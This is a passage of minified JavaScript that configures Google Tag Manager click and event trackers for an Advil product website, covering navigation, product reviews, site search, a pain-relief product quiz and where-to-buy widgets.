GTMTracker({id:"headerSubNavImgTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{sharerText}}:{{childText}}",eventTargetSelector:".megamenu-submenu-item a[href] img",eventTargetClosestSelector:".content",eventTargetChildSelector:".image-title a",eventTargetParentSelector:".megamenu-nav-container",eventTargetSharerSelector:".megamenu-main-nav .navigation-item.is-active a"}).init(),bpComponents.bpTrackers.openMobileNavTracker=new GTMTracker({id:"openMobileNavTracker",eventCategory:"navigation",eventAction:"mobile",eventTrigger:"click",eventLabel:"open mobile navigation",eventTargetSelector:".navigation-mobile-menu:not(.opened),.navigation-mobile-menu:not(.opened) *",eventTargetClosestSelector:".navigation-mobile-menu"}).init(),bpComponents.bpTrackers.closeMobileNavTracker=new GTMTracker({id:"closeMobileNavTracker",eventCategory:"navigation",eventAction:"mobile",eventTrigger:"click",eventLabel:"close mobile navigation",eventTargetSelector:".navigation-mobile-menu.opened,.navigation-mobile-menu.opened *",eventTargetClosestSelector:".navigation-mobile-menu"}).init(),bpComponents.bpTrackers.countrySelectWithLanguageTracker=new GTMTracker({id:"countrySelectWithLanguageTracker",eventCategory:"navigation",eventAction:"country select",eventTrigger:"click",eventLabel:"{{countryWithLanguage}}",eventTargetSelector:".reference-language-block a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.footerLinkClickTracker=new GTMTracker({id:"footerLinkClickTracker",eventCategory:"navigation",eventAction:"footer",eventTrigger:"click",eventLabel:"{{text}} ",eventTargetSelector:".footer .list-footer ul li a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.BannerCtaClickedTraker=new GTMTracker({id:"BannerCta",eventCategory:"banner",eventAction:"{{childText}}",eventTrigger:"click",eventLabel:"Learn more",eventTargetSelector:".hero-banner-carousel .richText a, .hero-banner-carousel .richText a *",eventTargetClosestSelector:".advil-home-main-banner,.carousel-slide",eventTargetChildSelector:"h2,h1",eventTargetParentSelector:".advil-home-main-banner,.carousel-slide"}).init(),bpComponents.bpTrackers.carouselBannerCTAClickTraker=new GTMTracker({id:"carouselBannerCTAClickTraker",eventCategory:"carousel interaction",eventAction:"carousel banner click",eventTrigger:"click",eventLabel:"{{slidesCount2}}",eventTargetSelector:".common-questions-homepage .carouselSlide .richText a, .carouselSlide .richText a *",eventTargetClosestSelector:"a",eventTargetParentSelector:".common-questions-homepage .carouselSlide",eventTargetSharerSelector:".active .carouselSlide  h3"}).init(),bpComponents.bpTrackers.carouselBannerClickTraker=new GTMTracker({id:"carouselBannerClickTraker",eventCategory:"carousel interaction",eventAction:"carousel banner click",eventTrigger:"click",eventLabel:"{{slidesCount}}",eventTargetSelector:".carousel-slide a",eventTargetClosestSelector:"a",eventTargetParentSelector:".carousel-slides",eventTargetSharerSelector:".active .carousel-content h2, .carousel-content h1"}).init(),bpComponents.bpTrackers.carouselIndicatorClickedTraker=new GTMTracker({id:"carouselIndicatorClickedTraker",eventCategory:"carousel interaction",eventAction:"carousel indicator click",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".lSPager li a",eventTargetClosestSelector:"a"}).init(),window.trackerPreSlide=1,e(window).on("touchend",e=>{const t=e.target;if(isElement="function"==typeof t.matches,matched=isElement&&t.matches("li.carousel-slide:not(.clone) *"),matched){let e=document.querySelector(".lSPager li.active a").textContent;window.trackerPreSlide-parseInt(e)>0?dataLayer.push({event:"customEvent",eventCategory:"carousel interaction",eventAction:"carousel transition",eventLabel:"swipe left"}):dataLayer.push({event:"customEvent",eventCategory:"carousel interaction",eventAction:"carousel transition",eventLabel:"swipe right"}),window.trackerPreSlide=e}}),e(window).submit(t=>{const r=t.target;if(!e(r).hasClass("form-search")){const t=r.querySelectorAll("form .gigya-composite-control .gigya-error-msg-active"),n=[];for(field of t){const t=field.closest("div.gigya-composite-control").querySelector("span.gigya-label-text");if(Boolean(t))n.push(t.innerText);else{const t=field.closest("div.gigya-composite-control").querySelector("input"),r=Boolean(e(t).attr("data-gigya-placeholder"))?e(t).attr("data-gigya-placeholder"):e(t).attr("placeholder");n.push(r)}}if(n.length>0){const t=e(r).parents("[data-screen-set]").attr("data-screen-set");dataLayer.push({event:"customEvent",eventCategory:`form:${t}`,eventAction:"validation errors",eventLabel:n})}}}),gigyaraas.registerAction("onAfterSubmit","submission-gtm-tracker",function(e,t){dataLayer.push({event:"customEvent",eventCategory:`form:${t.screenSet}`,eventAction:"submission complete",eventLabel:location.href})}),bpComponents.bpTrackers.productRatedTracker=new GTMTracker({id:"productRatedTracker",eventCategory:"product ratings",eventAction:"{{childText}}",eventTrigger:"click",eventLabel:"{{sharerText}}",eventTargetSelector:".bv-submission-button-submit",eventTargetClosestSelector:".bv-mbox",eventTargetParentSelector:".bv-mbox",eventTargetSharerSelector:'.bv-rating-link[aria-checked="true"]:last-child .bv-off-screen',eventTargetChildSelector:".bv-subject-name-header"}).init(),bpComponents.bpTrackers.productReviewedTracker=new GTMTracker({id:"productReviewedTracker",eventCategory:"product reviews",eventAction:"review submission",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".bv-submission-button-submit",eventTargetClosestSelector:".bv-mbox",eventTargetChildSelector:".bv-subject-name-header"}).init(),bpComponents.bpTrackers.productReviewedTracker=new GTMTracker({id:"productReviewedTracker",eventCategory:"product reviews",eventAction:"flagged review",eventTrigger:"click",eventLabel:"{{reviewId}}",eventTargetSelector:".bv-content-report-btn",eventTargetClosestSelector:".bv-content-item"}).init(),bpComponents.bpTrackers.pageSharedTracker=new GTMTracker({id:"pageSharedTracker",eventCategory:"social share",eventAction:"{{childTitle}}",eventTrigger:"click",eventLabel:"share",eventTargetSelector:".shareThis-item *",eventTargetClosestSelector:".shareThis-item",eventTargetChildSelector:"a"}).init(),bpComponents.bpTrackers.SocialmediaTracker=new GTMTracker({id:"SocialmediaTracker",eventCategory:"social share",eventAction:"{{childTitle}}",eventTrigger:"click",eventLabel:"visit",eventTargetSelector:".socialIcon li a *",eventTargetClosestSelector:".socialIcon li",eventTargetChildSelector:"a"}).init(),Boolean(document.querySelector("body.layout-search-results"))){let e=document.querySelector(".searchResults-number"),t=0;Boolean(e)&&(t=e.childNodes[0].textContent.trim().split(" ")[0]);let r={event:"customEvent",eventCategory:"site search",eventAction:document.querySelector(".searchResults-term").textContent,eventLabel:"results:"+t};dataLayer.push(r)}bpComponents.bpTrackers.numberOfSearchResultsTracker=new GTMTracker({id:"numberOfSearchResultsTracker",eventCategory:"site search",eventAction:"{{sharerText}}",eventTrigger:"click",eventLabel:"selected:{{link}}",eventTargetSelector:".searchResults-title a",eventTargetClosestSelector:"a",eventTargetParentSelector:".searchResults",eventTargetSharerSelector:".searchResults-term"}).init(),bpComponents.bpTrackers.quizStartedTracker=new GTMTracker({id:"quizStartedTracker",eventCategory:"quiz:{{childText}}",eventAction:"start",eventTrigger:"click",eventLabel:"{{pageUrl}}",eventTargetSelector:".rf-cta a *",eventTargetClosestSelector:".rf-home-wrap",eventTargetChildSelector:"h1"}).init(),e(".rf-home-wrap").each((t,r)=>{e(r).find(".rf-cta a").click(t=>{let r={event:"customEvent",eventCategory:`quiz:${e(t.target).parents(".rf-home-wrap").find("h1").text()}`,eventAction:`1:${e(t.target).parents(".rf-home-wrap").find("h3").text()}`,eventLabel:e(t.target).text()};dataLayer.push(r)})}),e(window).click(t=>{const r=t.target;if(Boolean(r)&&"function"==typeof r.matches&&r.matches(".continue .next")){const t=e(r).parents(".hide");let n=t.attr("class");n=Boolean(n)?n.substring(n.indexOf("step-"),6):"null";const a=e(r).parents(".rf-content").find("h1").text(),o=t.find(" .select-title").text();let c="";t.find(".form-wrapper .ng-valid-parse, .form-wrapper input[checked]").each((t,r)=>c=c+e(r).parents("label").text()+",");let i={event:"customEvent",eventCategory:`quiz:${a}`,eventAction:`${n}:${o}`,eventLabel:c=c.substring(0,c.length-1)};dataLayer.push(i)}}),e(window).click(t=>{const r=t.target;if(Boolean(r)&&"function"==typeof r.matches&&r.matches(".continue .result")){const t=e(r).parents(".relief-finder-form"),n=e(r).parents(".rf-content").find("h1").text();let a="";t.find(".symptoms-results .product-info .title p").each((t,r)=>a=a+e(r).text()+",");let o={event:"customEvent",eventCategory:`quiz:${n}`,eventAction:"completed",eventLabel:a=a.substring(0,a.length-1)};dataLayer.push(o)}}),bpComponents.bpTrackers.whereToBuyButtonClickTracker=new GTMTracker({id:"whereToBuyButtonClickTracker",eventCategory:"where to buy",eventAction:"where to buy",eventTrigger:"click",eventLabel:"{{pageUrl}}",eventTargetSelector:".megamenu-top-bar-left .richText.last p a.top-bar-link",eventTargetClosestSelector:".richText.last"}).init(),bpComponents.bpTrackers.buyNowButtonClickTracker=new GTMTracker({id:"buyNowButtonClickTracker",eventCategory:"where to buy",eventAction:"buy now",eventTrigger:"click",eventLabel:"{{productName}}",eventTargetSelector:".ps-widget.ps-enabled *",eventTargetClosestSelector:".ps-widget"}).init(),bpComponents.bpTrackers.buyOnlineLocalTabsTracker=new GTMTracker({id:"buyOnlineLocalTabsTracker",eventCategory:"where to buy",eventAction:"tab select",eventTrigger:"click",eventLabel:"{{text}} ",eventTargetSelector:".ps-wtb label span",eventTargetClosestSelector:"span"}).init(),bpComponents.bpTrackers.onlineRetailerSelectedTracker=new GTMTracker({id:"onlineRetailerSelectedTracker",eventCategory:"where to buy",eventAction:"online retailer visit",eventTrigger:"click",eventLabel:"{{text}} ",eventTargetSelector:".ps-online-tab .ps-online-seller-select .ps-online-buy-button",eventTargetClosestSelector:".ps-online-buy-button"}).init(),bpComponents.bpTrackers.localRetailerSelectedTracker=new GTMTracker({id:"localRetailerSelectedTracker",eventCategory:"where to buy",eventAction:"local retailer visit",eventTrigger:"click",eventLabel:"{{altText}}",eventTargetSelector:".ps-local-store-container .ps-seller img",eventTargetClosestSelector:"img"}).init(),bpComponents.bpTrackers.locationSearchCompletedTracker=new GTMTracker({id:"locationSearchCompletedTracker",eventCategory:"where to buy",eventAction:"retailer search",eventTrigger:"click",eventLabel:"search field",eventTargetSelector:".ps-location input",eventTargetClosestSelector:"input"}).init(),bpComponents.bpTrackers.geolocationActivatedTracker=new GTMTracker({id:"locationSearchCompletedTracker",eventCategory:"where to buy",eventAction:"retailer search",eventTrigger:"click",eventLabel:"geolocation",eventTargetSelector:".ps-location .ps-map-geolocation-button",eventTargetClosestSelector:".ps-map-geolocation-button"}).init(),bpComponents.bpTrackers.getdirectionsTracker=new GTMTracker({id:"locationSearchCompletedTracker",eventCategory:"where to buy",eventAction:"get directions",eventTrigger:"click",eventLabel:"{{altText}}",eventTargetSelector:".ps-local-store-container .ps-seller img",eventTargetClosestSelector:"img"}).init(),bpComponents.bpTrackers.callRetailerTracker=new GTMTracker({id:"locationSearchCompletedTracker",eventCategory:"where to buy",eventAction:"call retailer",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:'.ps-local-store-container a[href^="tel"]',eventTargetClosestSelector:".ps-local-store-container",eventTargetChildSelector:"small.ps-local-seller-button"}).init(),bpComponents.bpTrackers.priceSpiderModalLoadsTracker=new GTMTracker({id:"priceSpiderModalLoadsTracker",eventCategory:"where to buy",eventAction:"load widget",eventTrigger:"click",eventLabel:"{{productName}}",eventTargetSelector:".ps-widget.ps-enabled",eventTargetClosestSelector:".ps-widget"}).init(),bpComponents.bpTrackers.PromotedLinkTracker=new GTMTracker({id:"PromotedLinkTracker",eventCategory:"product links",eventAction:"Suggest / Recommended",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:"#content .product-tile .richText .richText-content h3 a",eventTargetClosestSelector:"h3",eventTargetChildSelector:".richText-content h3 a "}).init()})})(Cog.jQuery()),checkGA();
(e=>{"en-US"!==e("html").attr("lang")&&"en-CA"!==e("html").attr("lang")||e(document).ready(t=>{"en-CA"!==e("html").attr("lang")||(bpComponents.bpTrackers.articleCategorySelectedTracker=new GTMTracker({id:"articleCategorySelectedTracker",eventCategory:"article links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".layout-article-hub .reference-resources-article-listing a[href] *",eventTargetClosestSelector:".box",eventTargetChildSelector:"p a[href]"}).init(),bpComponents.bpTrackers.articleCategorySelectedTracker=new GTMTracker({id:"articleCategorySelectedTracker",eventCategory:"article links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".layout-article-hub .reference-resources-article-listing a[href]",eventTargetClosestSelector:".box",eventTargetChildSelector:"p a[href]"}).init(),bpComponents.bpTrackers.articleSelectedTracker=new GTMTracker({id:"articleSelectedTracker",eventCategory:"article links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".layout-article-hub .richTextHyperlinkedImage  a[href]",eventTargetClosestSelector:"a"}).init()),"en-US"===e("html").attr("lang")&&(bpComponents.bpTrackers.articleReadMoreTracker=new GTMTracker({id:"articleReadMoreTracker",eventCategory:"article links",eventAction:"read more",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".component-content .richText-content h3 + p a",eventTargetClosestSelector:".richText-content",eventTargetChildSelector:"h3"}).init(),bpComponents.bpTrackers.articleListSelectionTracker=new GTMTracker({id:"articleListSelectionTracker",eventCategory:"article links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".component-content .richText-content h3 + p a",eventTargetClosestSelector:".richText-content",eventTargetChildSelector:"h3"}).init()),"en-US"===e("html").attr("lang")&&(bpComponents.bpTrackers.productCategorySelectedTracker=new GTMTracker({id:"productCategorySelectedTracker",eventCategory:"product links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".reference-relief-article-list-tips .component-content .richText-content a, .reference-relief-article-list-tips .component-content a img",eventTargetClosestSelector:" .component-content",eventTargetChildSelector:".richText-content p a"}).init(),bpComponents.bpTrackers.productSelectedTracker=new GTMTracker({id:"productSelectedTracker",eventCategory:"product links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".page-our-products .product-tile h3 a, .page-our-products .product-tile .image a",eventTargetClosestSelector:"a"}).init()),"en-CA"!==e("html").attr("lang")||(bpComponents.bpTrackers.productCategoryClickTracker=new GTMTracker({id:"productCategoryClickTracker",eventCategory:"product links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".layout-product-listing .filter-item-js:not(.active-js), .layout-product-listing .filter-item-js:not(.active-js) *",eventTargetClosestSelector:".filter-item-js"}).init(),bpComponents.bpTrackers.productPageSuggestedProductClick=new GTMTracker({id:"productPageSuggestedProductClick",eventCategory:"product links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:'.layout-product-listing [class*="reference-related-products-"] a, .layout-product-listing [class*="reference-related-products-"] a *,.layout-product-listing [class*= "reference-products-"] a, .layout-product-listing [class*= "reference-products-"] a *',eventTargetClosestSelector:'[class*="reference-related-products-"], [class*= "reference-products-"]',eventTargetChildSelector:"h3"}).init()),"en-US"===e("html").attr("lang")&&(bpComponents.bpTrackers.productDetailTabsTracker=new GTMTracker({id:"productDetailTabsTracker",eventCategory:"product links",eventAction:"detail tab",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".tabs-nav-item *",eventTargetClosestSelector:".text-wrapper"}).init()),"en-US"===e("html").attr("lang")&&(bpComponents.bpTrackers.faqCategorySelectedTracker=new GTMTracker({id:"faqCategorySelectedTracker",eventCategory:"faq links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".page-faqs .filter-item-js, .page-faqs .filter-item-js *",eventTargetClosestSelector:".filter-item-js"}).init(),bpComponents.bpTrackers.faqCategorylinkSelectedTracker=new GTMTracker({id:"faqCategorylinkSelectedTracker",eventCategory:"faq links",eventAction:"category selection",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".reference-faq-top-page-links .richText h3 a",eventTargetClosestSelector:"h3 a"}).init()),bpComponents.bpTrackers.faqQuestionOpenTracker=new GTMTracker({id:"faqQuestionOpenTracker",eventCategory:"faq",eventAction:"open",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".accordion-slide:not(.is-active) *",eventTargetClosestSelector:".accordion-slide",eventTargetChildSelector:".accordion-title-text"}).init(),bpComponents.bpTrackers.faqQuestionCloseTracker=new GTMTracker({id:"faqQuestionCloseTracker",eventCategory:"faq",eventAction:"close",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".accordion-slide.is-active *",eventTargetClosestSelector:".accordion-slide",eventTargetChildSelector:".accordion-title-text"}).init(),e(window).click(t=>{const r=t.target;if(Boolean(r)&&"function"==typeof r.matches&&r.matches(".accordion-content a")){const t=e(r).attr("href")||"";if(Boolean(t)){let c="article links";t.indexOf("products/")>=0&&(c="product links");let n={event:"customEvent",eventCategory:c,eventAction:"faq click",eventLabel:e(r).text()};dataLayer.push(n)}}})})})(Cog.jQuery());
(e=>{"es-CO"===e("html").attr("lang")&&e(document).ready(t=>{bpComponents.bpTrackers.internalLinksTracker=new GTMTracker({id:"internalLinksTracker",eventCategory:"internal links",eventAction:"{{text}}",eventTrigger:"click",eventLabel:"{{fullInternalLink}}",eventTargetSelector:'a[href]:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]), a:not(.external):not([href^="#"]):not([href^="tel:"]):not([href^="mailto:"]) *',eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.externalLinksTracker=new GTMTracker({id:"externalLinksTracker",eventCategory:"external links",eventAction:"{{text}}",eventTrigger:"click",eventLabel:"{{link}}",eventTargetSelector:"a.external, a.external *",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.advilCOquizStartedTracker=new GTMTracker({id:"advilCOquizStartedTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"start",eventTrigger:"click",eventLabel:"{{pageUrl}}",eventTargetSelector:"#genero .kid, #genero .mujer, #genero .hombre",eventTargetClosestSelector:"#genero"}).init(),bpComponents.bpTrackers.q1ChildTracker=new GTMTracker({id:"q1ChildTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 1: SELENCCIONA EL GÉNERO",eventTrigger:"click",eventLabel:"NIÑOS",eventTargetSelector:"#genero .kid",eventTargetClosestSelector:"#genero"}).init(),bpComponents.bpTrackers.q1WomanTracker=new GTMTracker({id:"q1ChildTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 1: SELENCCIONA EL GÉNERO",eventTrigger:"click",eventLabel:"MUJER",eventTargetSelector:"#genero .mujer",eventTargetClosestSelector:"#genero"}).init(),bpComponents.bpTrackers.q1ManTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 1: SELENCCIONA EL GÉNERO",eventTrigger:"click",eventLabel:"HOMBRE",eventTargetSelector:"#genero .hombre",eventTargetClosestSelector:"#genero"}).init(),bpComponents.bpTrackers.q2ChildDolorOidoTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"DOLOR OÍDO",eventTargetSelector:"#localizar-kid .oido",eventTargetClosestSelector:"#localizar-kid"}).init(),bpComponents.bpTrackers.q2ChildDolorGarantaTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"DOLOR GARGANTA",eventTargetSelector:"#localizar-kid .garganta",eventTargetClosestSelector:"#localizar-kid"}).init(),bpComponents.bpTrackers.q2ChildFiebreTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"FIEBRE",eventTargetSelector:"#localizar-kid .fiebre",eventTargetClosestSelector:"#localizar-kid"}).init(),bpComponents.bpTrackers.q2ChildMalestarGeneralTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"MALESTAR GENERAL",eventTargetSelector:"#localizar-kid .m-general",eventTargetClosestSelector:"#localizar-kid"}).init(),bpComponents.bpTrackers.q2ManWomanFurteTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: INTENSIDAD DEL DOLOR",eventTrigger:"click",eventLabel:"FUERTE",eventTargetSelector:"#selctor-fuerte",eventTargetClosestSelector:"#selctor-fuerte"}).init(),bpComponents.bpTrackers.q2ManWomanModeradoTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 2: INTENSIDAD DEL DOLOR",eventTrigger:"click",eventLabel:"MODERADO",eventTargetSelector:"#selctor-moderado",eventTargetClosestSelector:"#selctor-moderado"}).init(),bpComponents.bpTrackers.q3WomanManManColicoMenstrualTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"CÓLICO MENSTRUAL",eventTargetSelector:"#localizar .mestrual",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManEsosDiasTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"DOLORES DE ESOS DÍAS",eventTargetSelector:"#localizar .esos-dias",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManEsosDiasTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"ESPALDA",eventTargetSelector:"#localizar .espalda",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManMuscularTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"MUSCULAR",eventTargetSelector:"#localizar .muscular",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManCuelloTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"CUELLO",eventTargetSelector:"#localizar .cuello",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManArticularTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"ARTICULAR",eventTargetSelector:"#localizar .articular",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManGripaTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"SÍNTOMAS GRIPA",eventTargetSelector:"#localizar .gripa",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManMigrannaTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"CABEZA MIGRAÑA",eventTargetSelector:"#localizar .migranna",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManGeneralTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"DOLOR",eventTargetSelector:"#localizar .general",eventTargetClosestSelector:"#localizar"}).init(),bpComponents.bpTrackers.q3WomanManFiebreTracker=new GTMTracker({id:"q1ManTracker",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"question 3: LOCALIZAR EL DOLOR",eventTrigger:"click",eventLabel:"FIEBRE",eventTargetSelector:"#localizar-mujer .fiebre,#localizar-hombre .fiebre",eventTargetClosestSelector:"#localizar-mujer"}).init(),e(".conoce-aqui").on("click",e=>{const t=function(){let e="";return"children"==window.genero?e="/nuestros-productos/advil-children":"hombre"==window.genero?"fuerte"==window.intensidad?"espalda"==window.loca?e="/nuestros-productos/advil-max":"muscular"==window.loca?e="/nuestros-productos/advil-max":"cuello"==window.loca?e="/nuestros-productos/advil-max":"articular"==window.loca?e="/nuestros-productos/advil-max":"gripa"==window.loca?e="/nuestros-productos/advil-gripa":"migrana"==window.loca&&(e="/nuestros-productos/advil-ultra"):"moderado"==window.intensidad&&("general"==window.loca?e="/nuestros-productos/advil-fastgel":"gripa"==window.loca?e="/nuestros-productos/advil-gripa":"fiebre"==window.loca&&(e="/nuestros-productos/advil-fastgel")):"mujer"==window.genero&&("fuerte"==window.intensidad?"menstrual"==window.loca?e="/nuestros-productos/advil-fem":"esos dias"==window.loca?e="/nuestros-productos/advil-fem":"espalda"==window.loca?e="/nuestros-productos/advil-max":"muscular"==window.loca?e="/nuestros-productos/advil-max":"cuello"==window.loca?e="/nuestros-productos/advil-max":"articular"==window.loca?e="/nuestros-productos/advil-max":"gripa"==window.loca?e="/nuestros-productos/advil-gripa":"general"==window.loca?e="/nuestros-productos/advil-fastgel":"migrana"==window.loca&&(e="/nuestros-productos/advil-ultra"):"moderado"==window.intensidad&&("menstrual"==window.loca?e="/nuestros-productos/advil-fem":"esos dias"==window.loca?e="/nuestros-productos/advil-fem":"gripa"==window.loca?e="/nuestros-productos/advil-gripa":"general"==window.loca?e="/nuestros-productos/advil-fastgel":"fiebre"==window.loca&&(e="/nuestros-productos/advil-fastgel"))),e}();console.log(t),dataLayer.push({event:"customEvent",eventCategory:"ENCUENTRA EL PRODUCTO ADVIL PARA TU TIPO DE DOLOR",eventAction:"completed",eventLabel:t})}),bpComponents.bpTrackers.headerTopNavTracker=new GTMTracker({id:"headerTopNavTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".megamenu .megamenu-main-nav ul.navigation-branch.navigation-level1 .navigation-level1 > a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.headerSubNavTracker=new GTMTracker({id:"headerSubNavTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{sharerText}}:{{text}}",eventTargetSelector:".megamenu-submenu-item a[href]",eventTargetClosestSelector:"a",eventTargetParentSelector:".megamenu-nav-container",eventTargetSharerSelector:".megamenu-main-nav .navigation-item.is-active a"}).init(),bpComponents.bpTrackers.openMobileNavTracker=new GTMTracker({id:"openMobileNavTracker",eventCategory:"navigation",eventAction:"mobile",eventTrigger:"click",eventLabel:"open mobile navigation",eventTargetSelector:".navigation-mobile-menu:not(.opened),.navigation-mobile-menu:not(.opened) *",eventTargetClosestSelector:".navigation-mobile-menu"}).init(),bpComponents.bpTrackers.closeMobileNavTracker=new GTMTracker({id:"closeMobileNavTracker",eventCategory:"navigation",eventAction:"mobile",eventTrigger:"click",eventLabel:"close mobile navigation",eventTargetSelector:".navigation-mobile-menu.opened,.navigation-mobile-menu.opened *",eventTargetClosestSelector:".navigation-mobile-menu"}).init(),bpComponents.bpTrackers.brandLogoTracker=new GTMTracker({id:"brandLogoTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"{{altText}}",eventTargetSelector:".megamenu-logo a *",eventTargetClosestSelector:"img",eventTargetChildSelector:"img"}).init(),bpComponents.bpTrackers.logoGskTracker=new GTMTracker({id:"logoGskTracker",eventCategory:"navigation",eventAction:"header",eventTrigger:"click",eventLabel:"GSK logo",eventTargetSelector:'a[title="GSK-logo"] *',eventTargetClosestSelector:'a[title="GSK-logo"]'}).init(),bpComponents.bpTrackers.countrySelectWithLanguageTracker=new GTMTracker({id:"countrySelectWithLanguageTracker",eventCategory:"navigation",eventAction:"country select",eventTrigger:"click",eventLabel:"{{countryWithLanguage}}",eventTargetSelector:".reference-language-block a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.footerLinkClickTracker=new GTMTracker({id:"footerLinkClickTracker",eventCategory:"navigation",eventAction:"footer",eventTrigger:"click",eventLabel:"{{text}} ",eventTargetSelector:".footer .list-footer ul li a",eventTargetClosestSelector:"a"}).init(),bpComponents.bpTrackers.SocialmediaTracker=new GTMTracker({id:"SocialmediaTracker",eventCategory:"social share",eventAction:"{{childTitle}}",eventTrigger:"click",eventLabel:"visit",eventTargetSelector:".socialIcon li a *",eventTargetClosestSelector:".socialIcon li",eventTargetChildSelector:"a"}).init(),bpComponents.bpTrackers.homePageSuggestedProductClick=new GTMTracker({id:"homePageSuggestedProductClick",eventCategory:"product 